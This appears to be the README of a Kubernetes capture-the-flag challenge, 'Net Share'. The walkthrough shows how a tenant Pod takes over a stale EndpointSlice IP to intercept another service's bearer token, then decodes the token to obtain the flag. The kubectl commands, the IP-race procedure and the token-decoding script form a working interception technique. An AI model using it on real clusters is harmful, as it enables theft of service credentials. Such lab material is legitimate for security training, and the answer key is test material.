# Net Share

Net Share is a Kubernetes CTF challenge about stale EndpointSlice data and Pod
IP reuse. This directory is self-contained for an open/local Kubernetes
environment.

## Files

| File | Purpose |
|---|---|
| `challenge.yaml` | Challenge namespaces, victim service, stale EndpointSlice controller, policies, and platform worker. |
| `user.yaml` | Low-privilege `runtime-operator` identity and RBAC. |
| `exp.yaml` | Target Pod manifest for manual exploitation. |
| `solve.sh` | Optional local solver reference. |

## Deploy

Apply the challenge resources:

```bash
kubectl apply -f challenge.yaml
kubectl apply -f user.yaml
```

Wait for the workloads:

```bash
kubectl get pods -n customer-platform -o wide
kubectl get pods -n platform-operations -o wide
```

Expected Pods:

```text
NAME                                    READY   STATUS    RESTARTS   AGE   IP
customer-profile-api-7b6b9897c8-g4lq8   1/1     Running   0          38s   10.244.1.34
```

```text
NAME                                           READY   STATUS    RESTARTS   AGE
endpoint-catalog-reconciler-7d46f975d8-k5r4p   1/1     Running   0          38s
profile-cache-refresh-67c577c789-l9t4d         1/1     Running   0          38s
```

`challenge.yaml` contains the placeholder assertion
`svc.v1.pending.pending`. In a real game environment the platform should patch
`platform-operations/profile-client-credentials` with a per-team assertion that
contains the flag in `service_proof`.

## Scenario

The workload is split across three namespaces:

| Namespace | Purpose |
|---|---|
| `tenant-runtime` | Writable workspace for creating target Pods and reading their logs. |
| `customer-platform` | Victim namespace containing `customer-profile-api`, selectorless Service `profile-query`, and EndpointSlice `profile-query-registry`. |
| `platform-operations` | Platform worker namespace containing `profile-cache-refresh` and `endpoint-catalog-reconciler`. |

`profile-cache-refresh` sends a request roughly every 10 seconds:

```text
Authorization: Bearer svc.v1.<base64url-json-payload>.<hmac-sha256-signature>
```

The flag is inside the decoded payload's `service_proof` field.

## Vulnerability

`profile-query` is a selectorless Service. Its backend is manually maintained in
the EndpointSlice `profile-query-registry`. When
`endpoint-catalog-reconciler` recycles the backend Pod, it leaves the
EndpointSlice pointing at the old Pod IP for a 28-second stale window.

During that window:

```text
profile-cache-refresh -> profile-query (ClusterIP) -> kube-proxy DNAT -> old Pod IP:8080
```

If the target Pod obtains the old IP before the EndpointSlice is updated,
kube-proxy forwards the platform request to the target Pod.

## Exploit

### Step 1 - Watch for the stale window

Open two terminals:

```bash
kubectl get pods -n customer-platform -o wide -w
```

Then get:

```text
NAME                                    READY   STATUS        RESTARTS   AGE   IP            NODE
customer-profile-api-7b6b9897c8-g4lq8   1/1     Running       0          39s   10.244.1.34   worker-0
customer-profile-api-7b6b9897c8-g4lq8   1/1     Terminating   0          40s   10.244.1.34   worker-0
customer-profile-api-7b6b9897c8-k2p9m   1/1     Running       0          2s    10.244.1.37   worker-0
...
```

```bash
kubectl get endpointslices -n customer-platform -w
```

With the output:

```text
NAME                     ADDRESSTYPE   PORTS   ENDPOINTS     AGE
profile-query-registry   IPv4          8080    10.244.1.34   5m42s
profile-query-registry   IPv4          8080    10.244.1.34   6m10s
profile-query-registry   IPv4          8080    10.244.1.37   6m38s
...
```

The stale window exists when the EndpointSlice still advertises the old IP, but
the Running backend Pod has moved to another IP or is temporarily absent.

### Step 2 - Acquire the stale backend IP

Compare the EndpointSlice IP and the Running backend Pod IP:

```bash
ADV=$(kubectl get endpointslices -n customer-platform \
  -l kubernetes.io/service-name=profile-query \
  -o jsonpath='{.items[0].endpoints[0].addresses[0]}')

POD=$(kubectl get pods -n customer-platform \
  -l app.kubernetes.io/name=customer-profile-api \
  --field-selector status.phase=Running \
  -o jsonpath='{.items[0].status.podIP}')

echo "advertised=$ADV running=${POD:-<none>}"
```

Apply the target Pod:

```bash
kubectl apply -f exp.yaml
```

Check its IP:

```bash
kubectl get pod connectivity-probe-1 -n tenant-runtime -o jsonpath='{.status.podIP}'; echo
```

If the Pod IP does not match `$ADV`, delete it and retry while the stale window
is still open:

```bash
kubectl delete pod connectivity-probe-1 -n tenant-runtime --grace-period=0 --force
```

### Step 3 - Capture the raw header

When the target Pod has the stale backend IP, follow its logs:

```bash
kubectl logs -f connectivity-probe-1 -n tenant-runtime
```

Captured raw header:

```text
[*] connectivity probe ready on :8080
=== raw request headers ===
GET /v1/cache/refresh/profile-snapshot
Host: profile-query.customer-platform.svc.cluster.local
User-Agent: curl/8.5.0
Accept: */*
Authorization: Bearer svc.v1.eyJhdWQiOiJjdXN0b21lci1wcm9maWxlLWFwaSIsImV4cCI6MTcxMDA4NjQwMCwiaWF0IjoxNzEwMDAwMDAwLCJpc3MiOiJwcm9maWxlLWNhY2hlLXJlZnJlc2giLCJzY29wZSI6InByb2ZpbGUucmVhZCIsInNlcnZpY2VfcHJvb2YiOiJzay00NWRhNjUyOS1lYzRlLWI4ODAtN2Y1Zi0yZDRmYTMxYjNjOTYiLCJ0ZW5hbnQiOiJ0ZW5hbnQtcnVudGltZSJ9.example-signature
X-Request-ID: 4ef42264-7d9d-44f5-8af0-8ef2b96f7747
X-Tenant-ID: tenant-runtime
X-Service-Route: profile-cache-refresh
```

### Step 4 - Decode the Base64URL payload

The assertion format is:

```text
svc.v1.<base64url-json-payload>.<signature>
```

Decode the third field:

```bash
TOKEN='svc.v1.eyJhdWQiOiJjdXN0b21lci1wcm9maWxlLWFwaSIsImV4cCI6MTcxMDA4NjQwMCwiaWF0IjoxNzEwMDAwMDAwLCJpc3MiOiJwcm9maWxlLWNhY2hlLXJlZnJlc2giLCJzY29wZSI6InByb2ZpbGUucmVhZCIsInNlcnZpY2VfcHJvb2YiOiJzay00NWRhNjUyOS1lYzRlLWI4ODAtN2Y1Zi0yZDRmYTMxYjNjOTYiLCJ0ZW5hbnQiOiJ0ZW5hbnQtcnVudGltZSJ9.example-signature'

python3 - "$TOKEN" <<'PY'
import base64
import json
import sys

token = sys.argv[1].removeprefix("Bearer ").strip()
parts = token.split(".")
payload = parts[2] + "=" * (-len(parts[2]) % 4)
data = json.loads(base64.urlsafe_b64decode(payload))
print(json.dumps(data, indent=2, sort_keys=True))
print("flag =", data["service_proof"])
PY
```

Decoded output:

```json
{
  "aud": "customer-profile-api",
  "exp": 1710086400,
  "iat": 1710000000,
  "iss": "profile-cache-refresh",
  "scope": "profile.read",
  "service_proof": "sk-45da6529-ec4e-b880-7f5f-2d4fa31b3c96",
  "tenant": "tenant-runtime"
}
```

```text
flag = sk-45da6529-ec4e-b880-7f5f-2d4fa31b3c96
```
